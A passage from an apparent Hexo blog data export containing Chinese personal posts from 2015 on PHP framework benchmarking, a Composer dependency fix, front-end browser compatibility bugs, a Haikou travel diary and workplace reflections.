(mean)<br>Time per request:       1.682 [ms] (mean)<br>Time per request:       1.682 [ms] (mean, across all concurrent requests)<br>Transfer rate:          216.03 [Kbytes/sec] received</pre><br>&nbsp;</p>\n","site":{"data":{}},"excerpt":"","more":"<p>周末对yii2和laravel5.1进行了简单的性能测试，结果是yii2比laravel5.1快很多。</p>\n<h2 id=\"测试环境\"><a href=\"#测试环境\" class=\"headerlink\" title=\"测试环境\"></a>测试环境</h2><h3 id=\"系统\"><a href=\"#系统\" class=\"headerlink\" title=\"系统\"></a>系统</h3><ul>\n<li>Fedora 22</li>\n<li>linux: Linux 4.0.8-300.fc22.x86_64</li>\n<li>gcc: 版本 5.1.1 20150618 (Red Hat 5.1.1-4) (GCC)</li>\n<li>Mem: 8 GiB</li>\n<li>cpu: Intel® Core™ i7-4702MQ CPU @ 2.20GHz × 8</li>\n</ul>\n<h3 id=\"框架\"><a href=\"#框架\" class=\"headerlink\" title=\"框架\"></a>框架</h3><ul>\n<li>laravel 5.1</li>\n<li>yii 2.0 (basic类型，它和advanced区别主要在于目录结构，就是少include了两三个配置文件，性能差距不大)</li>\n</ul>\n<h3 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h3><ul>\n<li>统一都是生产环境，关闭了debug。</li>\n<li>语言包等其他配置都选用默认的配置</li>\n</ul>\n<h3 id=\"测试代码\"><a href=\"#测试代码\" class=\"headerlink\" title=\"测试代码\"></a>测试代码</h3><p>定义一个新的控制器，简单的输出 hello 字符</p>\n<h2 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h2><p>我每次用<strong>ab -n 3000</strong>来测试，分成多次交叉测试，得出的结果都差不多。</p>\n<h3 id=\"结果\"><a href=\"#结果\" class=\"headerlink\" title=\"结果\"></a>结果</h3><p>在默认情况下，简单的输出hello程序下，yii2的性能是laravel5.1的4倍多！</p>\n<p>我原先以为差不了多少，但真的很意外。不过laravel我不太熟悉，也许有哪些可以优化的地方，但在默认配置下，yii2确实完爆laravel。</p>\n<p>当然评价框架不能只看性能，我用yii2做过三四个项目，它在功能和设计方面也很强大，扩展性十足。是我最爱的框架！</p>\n<h2 id=\"不公平的地方\"><a href=\"#不公平的地方\" class=\"headerlink\" title=\"不公平的地方\"></a>不公平的地方</h2><p>yii2默认不会设置session和XSRF-TOKEN，但laravel会，所以主要性能差距应该就是这个造成的。但从设计上，yii2总是按需加载，只有当使用视图的<strong>ActiveForm</strong>时它才会主动设置<strong>XSRF</strong>，显然比laravel要灵活。</p>\n<p>所以我也给yii加上了启用session的代码：<code>\\Yii::$app-&amp;gt;session-&amp;gt;open();</code>，但仍然比laravel快4倍多。结果见最下。</p>\n<h2 id=\"原因\"><a href=\"#原因\" class=\"headerlink\" title=\"原因\"></a>原因</h2><p>至于为什么差距这么大，下次有时间再看吧。已知的差别：</p>\n<ul>\n<li>laravel自己实现了session，比起yii2用的原生的要慢，但可能安全性更高。<br>&nbsp;</li>\n</ul>\n<h3 id=\"附测试数据\"><a href=\"#附测试数据\" class=\"headerlink\" title=\"附测试数据\"></a>附测试数据</h3><p>ab测试3000次请求，这里各列出随机的一组测试</p>\n<h4 id=\"laravel-5-1\"><a href=\"#laravel-5-1\" class=\"headerlink\" title=\"laravel 5.1\"></a>laravel 5.1</h4><pre>$ ab -n 3000 http://laravel.localhost/test\nConcurrency Level:      1\nTime taken for tests:   19.507 seconds\nComplete requests:      3000\nFailed requests:        0\nTotal transferred:      2952398 bytes\nHTML transferred:       15000 bytes\nRequests per second:    153.79 [#/sec] (mean)\nTime per request:       6.502 [ms] (mean)\nTime per request:       6.502 [ms] (mean, across all concurrent requests)\nTransfer rate:          147.81 [Kbytes/sec] received\n</pre>\n\n<h4 id=\"Yii-2-0-（默认配置，不开启session）\"><a href=\"#Yii-2-0-（默认配置，不开启session）\" class=\"headerlink\" title=\"Yii 2.0 （默认配置，不开启session）\"></a>Yii 2.0 （默认配置，不开启session）</h4><pre>$ ab -n 3000 http://yii2.localhost/test\nConcurrency Level:      1\nTime taken for tests:   4.456 seconds\nComplete requests:      3000\nFailed requests:        0\nTotal transferred:      501000 bytes\nHTML transferred:       15000 bytes\nRequests per second:    673.24 [#/sec] (mean)\nTime per request:       1.485 [ms] (mean)\nTime per request:       1.485 [ms] (mean, across all concurrent requests)\nTransfer rate:          109.80 [Kbytes/sec] received\n</pre>\n\n<h4 id=\"Yii-2-0-（为了和laravel保持一致，所以也开启session）\"><a href=\"#Yii-2-0-（为了和laravel保持一致，所以也开启session）\" class=\"headerlink\" title=\"Yii 2.0 （为了和laravel保持一致，所以也开启session）\"></a>Yii 2.0 （为了和laravel保持一致，所以也开启session）</h4><p><pre>Concurrency Level:      1<br>Time taken for tests:   5.045 seconds<br>Complete requests:      3000<br>Failed requests:        0<br>Total transferred:      1116000 bytes<br>HTML transferred:       15000 bytes<br>Requests per second:    594.67 [#/sec] (mean)<br>Time per request:       1.682 [ms] (mean)<br>Time per request:       1.682 [ms] (mean, across all concurrent requests)<br>Transfer rate:          216.03 [Kbytes/sec] received</pre><br>&nbsp;</p>\n"},{"title":"yii2 composer错误: Invalid version string &quot;2.*&quot;","id":"155","date":"2015-08-02T07:59:57.000Z","_content":"\n在更新或安装yii2时，现在会出现一个composer库的错误：\n<pre>$ composer global require \"fxp/composer-asset-plugin:~1.0.0\"\n$ composer create-project --prefer-dist yiisoft/yii2-app-basic basic\nInstalling yiisoft/yii2-app-basic (2.0.4)\n  - Installing yiisoft/yii2-app-basic (2.0.4)\n    Downloading: 100%         \n\nCreated project in basic\nLoading composer repositories with package information\nInstalling dependencies (including require-dev)\n\n  [UnexpectedValueException]                                              \n  Could not parse version constraint &lt;=2.*: Invalid version string \"2.*\"  \n\n</pre>\n这是yii2依赖库 **fxp/composer-asset-plugin** 的问题，要解决这个问题，需要升级它。\n\nyii2官网上让我们使用的是 1.0.0版本，现在要使用最新的dev-master版本才行。可以直接运行：\n<pre>$ composer.phar global require \"fxp/composer-asset-plugin:1.0.*@dev\"</pre>\n它会覆盖掉原先global全局有问题的1.0.0版本配置\n\n然后重新 **composer update** 即可\n\n参考：\n\n[http://stackoverflow.com/questions/31681630/yii2-composer-update-error-invalid-version-string-2](http://stackoverflow.com/questions/31681630/yii2-composer-update-error-invalid-version-string-2)","source":"_posts/yii2-composer-e9-94-99-e8-af-af-invalid-version-string-2.md","raw":"---\ntitle: 'yii2 composer错误: Invalid version string &quot;2.*&quot;'\nid: 155\ncategories:\n  - php\ndate: 2015-08-02 15:59:57\ntags:\n---\n\n在更新或安装yii2时，现在会出现一个composer库的错误：\n<pre>$ composer global require \"fxp/composer-asset-plugin:~1.0.0\"\n$ composer create-project --prefer-dist yiisoft/yii2-app-basic basic\nInstalling yiisoft/yii2-app-basic (2.0.4)\n  - Installing yiisoft/yii2-app-basic (2.0.4)\n    Downloading: 100%         \n\nCreated project in basic\nLoading composer repositories with package information\nInstalling dependencies (including require-dev)\n\n  [UnexpectedValueException]                                              \n  Could not parse version constraint &lt;=2.*: Invalid version string \"2.*\"  \n\n</pre>\n这是yii2依赖库 **fxp/composer-asset-plugin** 的问题，要解决这个问题，需要升级它。\n\nyii2官网上让我们使用的是 1.0.0版本，现在要使用最新的dev-master版本才行。可以直接运行：\n<pre>$ composer.phar global require \"fxp/composer-asset-plugin:1.0.*@dev\"</pre>\n它会覆盖掉原先global全局有问题的1.0.0版本配置\n\n然后重新 **composer update** 即可\n\n参考：\n\n[http://stackoverflow.com/questions/31681630/yii2-composer-update-error-invalid-version-string-2](http://stackoverflow.com/questions/31681630/yii2-composer-update-error-invalid-version-string-2)","slug":"yii2-composer-e9-94-99-e8-af-af-invalid-version-string-2","published":1,"updated":"2018-03-05T11:32:58.735Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cima00gwgmlmdwspobzk","content":"<p>在更新或安装yii2时，现在会出现一个composer库的错误：</p>\n<p><pre>$ composer global require “fxp/composer-asset-plugin:~1.0.0”<br>$ composer create-project –prefer-dist yiisoft/yii2-app-basic basic<br>Installing yiisoft/yii2-app-basic (2.0.4)</pre></p>\n<ul>\n<li>Installing yiisoft/yii2-app-basic (2.0.4)<br>Downloading: 100%         </li>\n</ul>\n<p>Created project in basic<br>Loading composer repositories with package information<br>Installing dependencies (including require-dev)</p>\n<p>  [UnexpectedValueException]<br>  Could not parse version constraint &lt;=2.<em>: Invalid version string “2.</em>“  </p>\n<p><br>这是yii2依赖库 <strong>fxp/composer-asset-plugin</strong> 的问题，要解决这个问题，需要升级它。</p>\n<p>yii2官网上让我们使用的是 1.0.0版本，现在要使用最新的dev-master版本才行。可以直接运行：</p>\n<p><pre>$ composer.phar global require “fxp/composer-asset-plugin:1.0.*@dev”</pre><br>它会覆盖掉原先global全局有问题的1.0.0版本配置</p>\n<p>然后重新 <strong>composer update</strong> 即可</p>\n<p>参考：</p>\n<p><a href=\"http://stackoverflow.com/questions/31681630/yii2-composer-update-error-invalid-version-string-2\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/31681630/yii2-composer-update-error-invalid-version-string-2</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>在更新或安装yii2时，现在会出现一个composer库的错误：</p>\n<p><pre>$ composer global require “fxp/composer-asset-plugin:~1.0.0”<br>$ composer create-project –prefer-dist yiisoft/yii2-app-basic basic<br>Installing yiisoft/yii2-app-basic (2.0.4)</pre></p>\n<ul>\n<li>Installing yiisoft/yii2-app-basic (2.0.4)<br>Downloading: 100%         </li>\n</ul>\n<p>Created project in basic<br>Loading composer repositories with package information<br>Installing dependencies (including require-dev)</p>\n<p>  [UnexpectedValueException]<br>  Could not parse version constraint &lt;=2.<em>: Invalid version string “2.</em>“  </p>\n<p><br>这是yii2依赖库 <strong>fxp/composer-asset-plugin</strong> 的问题，要解决这个问题，需要升级它。</p>\n<p>yii2官网上让我们使用的是 1.0.0版本，现在要使用最新的dev-master版本才行。可以直接运行：</p>\n<p><pre>$ composer.phar global require “fxp/composer-asset-plugin:1.0.*@dev”</pre><br>它会覆盖掉原先global全局有问题的1.0.0版本配置</p>\n<p>然后重新 <strong>composer update</strong> 即可</p>\n<p>参考：</p>\n<p><a href=\"http://stackoverflow.com/questions/31681630/yii2-composer-update-error-invalid-version-string-2\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/31681630/yii2-composer-update-error-invalid-version-string-2</a></p>\n"},{"title":"十一游记","id":"173","date":"2015-09-26T18:01:55.000Z","_content":"\n本来打算十一之前骑车环游海南岛，想象把车子靠在海滩，在没有人的海边游个泳。结果到了海口，发现热的要命。这种高温下骑半个小时就会中暑。\n\n现在决定转而从重庆出发，用七八天时间到达陕西。正好买的廉价机票允许在海口停留两天，所以今天去海边玩玩。这是第一次真正接触大海，去年十一在青岛只是从海滩边骑车过，人山人海所以没有下去。\n\n今天去的是海口白沙滩公园，海边人不多，海水也稍微浑浊。只捡到几个很小的贝壳，不过还是很有意思。\n\n[![IMAG0071 (1)](https://xiaoai.me/wp-content/uploads/2015/09/IMAG0071-11-720x405.jpg)](https://xiaoai.me/wp-content/uploads/2015/09/IMAG0071-11.jpg)\n\n[![IMAG0069](https://xiaoai.me/wp-content/uploads/2015/09/IMAG00691-720x405.jpg)](https://xiaoai.me/wp-content/uploads/2015/09/IMAG00691.jpg)\n\n[![IMAG0073 (1)](https://xiaoai.me/wp-content/uploads/2015/09/IMAG0073-11-720x405.jpg)](https://xiaoai.me/wp-content/uploads/2015/09/IMAG0073-11.jpg)\n\n&nbsp;","source":"_posts/e5-8d-81-e4-b8-80-e6-b8-b8-e8-ae-b0.md","raw":"---\ntitle: 十一游记\nid: 173\ncategories:\n  - 骑行\ndate: 2015-09-27 02:01:55\ntags:\n---\n\n本来打算十一之前骑车环游海南岛，想象把车子靠在海滩，在没有人的海边游个泳。结果到了海口，发现热的要命。这种高温下骑半个小时就会中暑。\n\n现在决定转而从重庆出发，用七八天时间到达陕西。正好买的廉价机票允许在海口停留两天，所以今天去海边玩玩。这是第一次真正接触大海，去年十一在青岛只是从海滩边骑车过，人山人海所以没有下去。\n\n今天去的是海口白沙滩公园，海边人不多，海水也稍微浑浊。只捡到几个很小的贝壳，不过还是很有意思。\n\n[![IMAG0071 (1)](https://xiaoai.me/wp-content/uploads/2015/09/IMAG0071-11-720x405.jpg)](https://xiaoai.me/wp-content/uploads/2015/09/IMAG0071-11.jpg)\n\n[![IMAG0069](https://xiaoai.me/wp-content/uploads/2015/09/IMAG00691-720x405.jpg)](https://xiaoai.me/wp-content/uploads/2015/09/IMAG00691.jpg)\n\n[![IMAG0073 (1)](https://xiaoai.me/wp-content/uploads/2015/09/IMAG0073-11-720x405.jpg)](https://xiaoai.me/wp-content/uploads/2015/09/IMAG0073-11.jpg)\n\n&nbsp;","slug":"e5-8d-81-e4-b8-80-e6-b8-b8-e8-ae-b0","published":1,"updated":"2018-03-05T11:32:58.735Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cimb00gygmlm5ab51d3s","content":"<p>本来打算十一之前骑车环游海南岛，想象把车子靠在海滩，在没有人的海边游个泳。结果到了海口，发现热的要命。这种高温下骑半个小时就会中暑。</p>\n<p>现在决定转而从重庆出发，用七八天时间到达陕西。正好买的廉价机票允许在海口停留两天，所以今天去海边玩玩。这是第一次真正接触大海，去年十一在青岛只是从海滩边骑车过，人山人海所以没有下去。</p>\n<p>今天去的是海口白沙滩公园，海边人不多，海水也稍微浑浊。只捡到几个很小的贝壳，不过还是很有意思。</p>\n<p><a href=\"https://xiaoai.me/wp-content/uploads/2015/09/IMAG0071-11.jpg\" target=\"_blank\" rel=\"noopener\"><img src=\"https://xiaoai.me/wp-content/uploads/2015/09/IMAG0071-11-720x405.jpg\" alt=\"IMAG0071 (1)\"></a></p>\n<p><a href=\"https://xiaoai.me/wp-content/uploads/2015/09/IMAG00691.jpg\" target=\"_blank\" rel=\"noopener\"><img src=\"https://xiaoai.me/wp-content/uploads/2015/09/IMAG00691-720x405.jpg\" alt=\"IMAG0069\"></a></p>\n<p><a href=\"https://xiaoai.me/wp-content/uploads/2015/09/IMAG0073-11.jpg\" target=\"_blank\" rel=\"noopener\"><img src=\"https://xiaoai.me/wp-content/uploads/2015/09/IMAG0073-11-720x405.jpg\" alt=\"IMAG0073 (1)\"></a></p>\n<p>&nbsp;</p>\n","site":{"data":{}},"excerpt":"","more":"<p>本来打算十一之前骑车环游海南岛，想象把车子靠在海滩，在没有人的海边游个泳。结果到了海口，发现热的要命。这种高温下骑半个小时就会中暑。</p>\n<p>现在决定转而从重庆出发，用七八天时间到达陕西。正好买的廉价机票允许在海口停留两天，所以今天去海边玩玩。这是第一次真正接触大海，去年十一在青岛只是从海滩边骑车过，人山人海所以没有下去。</p>\n<p>今天去的是海口白沙滩公园，海边人不多，海水也稍微浑浊。只捡到几个很小的贝壳，不过还是很有意思。</p>\n<p><a href=\"https://xiaoai.me/wp-content/uploads/2015/09/IMAG0071-11.jpg\" target=\"_blank\" rel=\"noopener\"><img src=\"https://xiaoai.me/wp-content/uploads/2015/09/IMAG0071-11-720x405.jpg\" alt=\"IMAG0071 (1)\"></a></p>\n<p><a href=\"https://xiaoai.me/wp-content/uploads/2015/09/IMAG00691.jpg\" target=\"_blank\" rel=\"noopener\"><img src=\"https://xiaoai.me/wp-content/uploads/2015/09/IMAG00691-720x405.jpg\" alt=\"IMAG0069\"></a></p>\n<p><a href=\"https://xiaoai.me/wp-content/uploads/2015/09/IMAG0073-11.jpg\" target=\"_blank\" rel=\"noopener\"><img src=\"https://xiaoai.me/wp-content/uploads/2015/09/IMAG0073-11-720x405.jpg\" alt=\"IMAG0073 (1)\"></a></p>\n<p>&nbsp;</p>\n"},{"title":"新工作","id":"188","date":"2015-10-26T16:04:35.000Z","_content":"\n今天正式入职新公司，这是我的第五家公司了。\n\n觉得这家公司远不如上一家的技术氛围好，一整天都没有看见讨论技术方案的，更像是同学会，都在聊自己怎么坐车回家。七八个技术里只有一个做PHP的同事在写代码，其他人一整天都看起来都很闲，七点准时下班走人。\n\n所以一下午都在纠结要不要走人，只干了一天就走似乎说不过去，但是又学不到什么东西，以后找工作真的应该慎重。\n\n不过现在心里也在盘算着，这公司活不多，可以利用业余时间搞些开源项目，然后也攒些钱，明年五六月离职。有这些招牌项目，也许就有机会去美丽说，美团这样的大公司了。也正好利用这段时间，学习下计算机的基础课程，备战明年4月份自考。","source":"_posts/e6-96-b0-e5-b7-a5-e4-bd-9c.md","raw":"---\ntitle: 新工作\nid: 188\ncategories:\n  - 经历\ndate: 2015-10-27 00:04:35\ntags:\n---\n\n今天正式入职新公司，这是我的第五家公司了。\n\n觉得这家公司远不如上一家的技术氛围好，一整天都没有看见讨论技术方案的，更像是同学会，都在聊自己怎么坐车回家。七八个技术里只有一个做PHP的同事在写代码，其他人一整天都看起来都很闲，七点准时下班走人。\n\n所以一下午都在纠结要不要走人，只干了一天就走似乎说不过去，但是又学不到什么东西，以后找工作真的应该慎重。\n\n不过现在心里也在盘算着，这公司活不多，可以利用业余时间搞些开源项目，然后也攒些钱，明年五六月离职。有这些招牌项目，也许就有机会去美丽说，美团这样的大公司了。也正好利用这段时间，学习下计算机的基础课程，备战明年4月份自考。","slug":"e6-96-b0-e5-b7-a5-e4-bd-9c","published":1,"updated":"2018-03-05T11:32:58.735Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cimd00h0gmlm9n6jwwvm","content":"<p>今天正式入职新公司，这是我的第五家公司了。</p>\n<p>觉得这家公司远不如上一家的技术氛围好，一整天都没有看见讨论技术方案的，更像是同学会，都在聊自己怎么坐车回家。七八个技术里只有一个做PHP的同事在写代码，其他人一整天都看起来都很闲，七点准时下班走人。</p>\n<p>所以一下午都在纠结要不要走人，只干了一天就走似乎说不过去，但是又学不到什么东西，以后找工作真的应该慎重。</p>\n<p>不过现在心里也在盘算着，这公司活不多，可以利用业余时间搞些开源项目，然后也攒些钱，明年五六月离职。有这些招牌项目，也许就有机会去美丽说，美团这样的大公司了。也正好利用这段时间，学习下计算机的基础课程，备战明年4月份自考。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>今天正式入职新公司，这是我的第五家公司了。</p>\n<p>觉得这家公司远不如上一家的技术氛围好，一整天都没有看见讨论技术方案的，更像是同学会，都在聊自己怎么坐车回家。七八个技术里只有一个做PHP的同事在写代码，其他人一整天都看起来都很闲，七点准时下班走人。</p>\n<p>所以一下午都在纠结要不要走人，只干了一天就走似乎说不过去，但是又学不到什么东西，以后找工作真的应该慎重。</p>\n<p>不过现在心里也在盘算着，这公司活不多，可以利用业余时间搞些开源项目，然后也攒些钱，明年五六月离职。有这些招牌项目，也许就有机会去美丽说，美团这样的大公司了。也正好利用这段时间，学习下计算机的基础课程，备战明年4月份自考。</p>\n"},{"title":"framework7 入门笔记","id":"200","date":"2015-11-21T02:32:21.000Z","_content":"\nframework7是一个前端UI框架，它能保持和原生应用一样的UI风格，操作体验。\n> 官网 [http://www.idangero.us/framework7](http://www.idangero.us/framework7)\n今天遇到了第一个问题:\n\n初始化框架时报错:\n<pre>result of expression this[0].\"classList\" is not an object  (framework7.min.js:22)</pre>\n这是由于浏览器版本太低，比如 Safari7 不支持 `classList` 特性，才会有这个错误。\n> 支持的浏览器版本：[http://caniuse.com/#feat=classlist](http://caniuse.com/#feat=classlist)\n可以使用这个补丁解决： [https://github.com/eligrey/classList.js](https://github.com/eligrey/classList.js)\n\n需要在解析framework7.min.js之前，先加载这个补丁。它会给不支持的浏览器DOM补上`classList`的功能\n\n&nbsp;\n\n由于我只有一个android手机，没有测试出这个兼容性问题，浪费了其他同事的测试时间。后来在 [https://crossbrowsertesting.com/](https://crossbrowsertesting.com/) 上用真机IPAD免费测试，才算定位到问题。\n\n&nbsp;","source":"_posts/framework7-e5-85-a5-e9-97-a8-e7-ac-94-e8-ae-b0.md","raw":"---\ntitle: framework7 入门笔记\nid: 200\ncategories:\n  - 前端\ndate: 2015-11-21 10:32:21\ntags:\n---\n\nframework7是一个前端UI框架，它能保持和原生应用一样的UI风格，操作体验。\n> 官网 [http://www.idangero.us/framework7](http://www.idangero.us/framework7)\n今天遇到了第一个问题:\n\n初始化框架时报错:\n<pre>result of expression this[0].\"classList\" is not an object  (framework7.min.js:22)</pre>\n这是由于浏览器版本太低，比如 Safari7 不支持 `classList` 特性，才会有这个错误。\n> 支持的浏览器版本：[http://caniuse.com/#feat=classlist](http://caniuse.com/#feat=classlist)\n可以使用这个补丁解决： [https://github.com/eligrey/classList.js](https://github.com/eligrey/classList.js)\n\n需要在解析framework7.min.js之前，先加载这个补丁。它会给不支持的浏览器DOM补上`classList`的功能\n\n&nbsp;\n\n由于我只有一个android手机，没有测试出这个兼容性问题，浪费了其他同事的测试时间。后来在 [https://crossbrowsertesting.com/](https://crossbrowsertesting.com/) 上用真机IPAD免费测试，才算定位到问题。\n\n&nbsp;","slug":"framework7-e5-85-a5-e9-97-a8-e7-ac-94-e8-ae-b0","published":1,"updated":"2018-03-05T11:32:58.735Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cime00h2gmlm1phm695g","content":"<p>framework7是一个前端UI框架，它能保持和原生应用一样的UI风格，操作体验。</p>\n<blockquote>\n<p>官网 <a href=\"http://www.idangero.us/framework7\" target=\"_blank\" rel=\"noopener\">http://www.idangero.us/framework7</a><br>今天遇到了第一个问题:</p>\n</blockquote>\n<p>初始化框架时报错:</p>\n<p><pre>result of expression this[0].”classList” is not an object  (framework7.min.js:22)</pre><br>这是由于浏览器版本太低，比如 Safari7 不支持 <code>classList</code> 特性，才会有这个错误。</p>\n<blockquote>\n<p>支持的浏览器版本：<a href=\"http://caniuse.com/#feat=classlist\" target=\"_blank\" rel=\"noopener\">http://caniuse.com/#feat=classlist</a><br>可以使用这个补丁解决： <a href=\"https://github.com/eligrey/classList.js\" target=\"_blank\" rel=\"noopener\">https://github.com/eligrey/classList.js</a></p>\n</blockquote>\n<p>需要在解析framework7.min.js之前，先加载这个补丁。它会给不支持的浏览器DOM补上<code>classList</code>的功能</p>\n<p>&nbsp;</p>\n<p>由于我只有一个android手机，没有测试出这个兼容性问题，浪费了其他同事的测试时间。后来在 <a href=\"https://crossbrowsertesting.com/\" target=\"_blank\" rel=\"noopener\">https://crossbrowsertesting.com/</a> 上用真机IPAD免费测试，才算定位到问题。</p>\n<p>&nbsp;</p>\n","site":{"data":{}},"excerpt":"","more":"<p>framework7是一个前端UI框架，它能保持和原生应用一样的UI风格，操作体验。</p>\n<blockquote>\n<p>官网 <a href=\"http://www.idangero.us/framework7\" target=\"_blank\" rel=\"noopener\">http://www.idangero.us/framework7</a><br>今天遇到了第一个问题:</p>\n</blockquote>\n<p>初始化框架时报错:</p>\n<p><pre>result of expression this[0].”classList” is not an object  (framework7.min.js:22)</pre><br>这是由于浏览器版本太低，比如 Safari7 不支持 <code>classList</code> 特性，才会有这个错误。</p>\n<blockquote>\n<p>支持的浏览器版本：<a href=\"http://caniuse.com/#feat=classlist\" target=\"_blank\" rel=\"noopener\">http://caniuse.com/#feat=classlist</a><br>可以使用这个补丁解决： <a href=\"https://github.com/eligrey/classList.js\" target=\"_blank\" rel=\"noopener\">https://github.com/eligrey/classList.js</a></p>\n</blockquote>\n<p>需要在解析framework7.min.js之前，先加载这个补丁。它会给不支持的浏览器DOM补上<code>classList</code>的功能</p>\n<p>&nbsp;</p>\n<p>由于我只有一个android手机，没有测试出这个兼容性问题，浪费了其他同事的测试时间。后来在 <a href=\"https://crossbrowsertesting.com/\" target=\"_blank\" rel=\"noopener\">https://crossbrowsertesting.com/</a> 上用真机IPAD免费测试，才算定位到问题。</p>\n<p>&nbsp;</p>\n"},{"title":"微信自带的浏览器真蛋疼","id":"204","date":"2015-11-23T13:59:03.000Z","_content":"\n一些正常的页面，在微信自带的浏览器里打开，就会有奇怪的Javascript问题。\n\n比如最近两天遇到的：input标签的onclick事件无效。\n\n<pre>&lt;input type=\"text\" id=\"test_input\" /&gt;\n&lt;script type=\"text/javascript\"&gt;\n(function(input){\n  input.onclick = function(){\n    alert(\"it work\"); // but not work in ios weixin\n  }\n})(document.getElementById('test_input'));\n&lt;/script&gt;</pre>\n\n在iOS版微信下，点击input不会触发onclick事件，而安卓版微信却能正常触发。这不是iOS的问题，因为同一设备的下safari浏览器能正常触发。\n\n微信自带的浏览器用的是自家实现的QQ浏览器内核，这个事件不触发，我有两种猜测：\n\n1.  QQ浏览器内核的bug\n2.  为了节省内核安装包的大小，砍掉了不常用的事件和功能\n\n之前也遇到过，h5 radio标签的onstop,onstart等事件无效。\n\n不过我不懂客户端，不清楚浏览器内核是怎么实现的，所以暂时记录下，留待以后研究。\n\n&nbsp;","source":"_posts/e5-be-ae-e4-bf-a1-e8-87-aa-e5-b8-a6-e7-9a-84-e6-b5-8f-e8-a7-88-e5-99-a8-e7-9c-9f-e8-9b-8b-e7-96-bc.md","raw":"---\ntitle: 微信自带的浏览器真蛋疼\nid: 204\ncategories:\n  - 前端\ndate: 2015-11-23 21:59:03\ntags:\n---\n\n一些正常的页面，在微信自带的浏览器里打开，就会有奇怪的Javascript问题。\n\n比如最近两天遇到的：input标签的onclick事件无效。\n\n<pre>&lt;input type=\"text\" id=\"test_input\" /&gt;\n&lt;script type=\"text/javascript\"&gt;\n(function(input){\n  input.onclick = function(){\n    alert(\"it work\"); // but not work in ios weixin\n  }\n})(document.getElementById('test_input'));\n&lt;/script&gt;</pre>\n\n在iOS版微信下，点击input不会触发onclick事件，而安卓版微信却能正常触发。这不是iOS的问题，因为同一设备的下safari浏览器能正常触发。\n\n微信自带的浏览器用的是自家实现的QQ浏览器内核，这个事件不触发，我有两种猜测：\n\n1.  QQ浏览器内核的bug\n2.  为了节省内核安装包的大小，砍掉了不常用的事件和功能\n\n之前也遇到过，h5 radio标签的onstop,onstart等事件无效。\n\n不过我不懂客户端，不清楚浏览器内核是怎么实现的，所以暂时记录下，留待以后研究。\n\n&nbsp;","slug":"e5-be-ae-e4-bf-a1-e8-87-aa-e5-b8-a6-e7-9a-84-e6-b5-8f-e8-a7-88-e5-99-a8-e7-9c-9f-e8-9b-8b-e7-96-bc","published":1,"updated":"2018-03-05T11:32:58.735Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cimg00h4gmlmr4biwxit","content":"<p>一些正常的页面，在微信自带的浏览器里打开，就会有奇怪的Javascript问题。</p>\n<p>比如最近两天遇到的：input标签的onclick事件无效。</p>\n<pre>&lt;input type=\"text\" id=\"test_input\" /&gt;\n&lt;script type=\"text/javascript\"&gt;\n(function(input){\n  input.onclick = function(){\n    alert(\"it work\"); // but not work in ios weixin\n  }\n})(document.getElementById('test_input'));\n&lt;/script&gt;</pre>\n\n<p>在iOS版微信下，点击input不会触发onclick事件，而安卓版微信却能正常触发。这不是iOS的问题，因为同一设备的下safari浏览器能正常触发。</p>\n<p>微信自带的浏览器用的是自家实现的QQ浏览器内核，这个事件不触发，我有两种猜测：</p>\n<ol>\n<li>QQ浏览器内核的bug</li>\n<li>为了节省内核安装包的大小，砍掉了不常用的事件和功能</li>\n</ol>\n<p>之前也遇到过，h5 radio标签的onstop,onstart等事件无效。</p>\n<p>不过我不懂客户端，不清楚浏览器内核是怎么实现的，所以暂时记录下，留待以后研究。</p>\n<p>&nbsp;</p>\n","site":{"data":{}},"excerpt":"","more":"<p>一些正常的页面，在微信自带的浏览器里打开，就会有奇怪的Javascript问题。</p>\n<p>比如最近两天遇到的：input标签的onclick事件无效。</p>\n<pre>&lt;input type=\"text\" id=\"test_input\" /&gt;\n&lt;script type=\"text/javascript\"&gt;\n(function(input){\n  input.onclick = function(){\n    alert(\"it work\"); // but not work in ios weixin\n  }\n})(document.getElementById('test_input'));\n&lt;/script&gt;</pre>\n\n<p>在iOS版微信下，点击input不会触发onclick事件，而安卓版微信却能正常触发。这不是iOS的问题，因为同一设备的下safari浏览器能正常触发。</p>\n<p>微信自带的浏览器用的是自家实现的QQ浏览器内核，这个事件不触发，我有两种猜测：</p>\n<ol>\n<li>QQ浏览器内核的bug</li>\n<li>为了节省内核安装包的大小，砍掉了不常用的事件和功能</li>\n</ol>\n<p>之前也遇到过，h5 radio标签的onstop,onstart等事件无效。</p>\n<p>不过我不懂客户端，不清楚浏览器内核是怎么实现的，所以暂时记录下，留待以后研究。</p>\n<p>&nbsp;</p>\n"},{"title":"和女同事吃饭","id":"212","date":"2015-11-26T13:26:53.000Z","_content":"\n今天上午去吃顺口溜，碰巧部门一位女程序媛也去吃。\n\n为什么要这么猥琐的做个记录呢，因为我好几年都没和女生单独坐一起了，更别提交谈了。虽然只是普通同事，但心里感觉非常nice。\n\n&nbsp;\n\n所以有时觉得自己过的挺悲催的，可能就要一辈子打光棍了。","source":"_posts/e5-92-8c-e5-a5-b3-e5-90-8c-e4-ba-8b-e5-90-83-e9-a5-ad.md","raw":"---\ntitle: 和女同事吃饭\nid: 212\ncategories:\n  - 经历\ndate: 2015-11-26 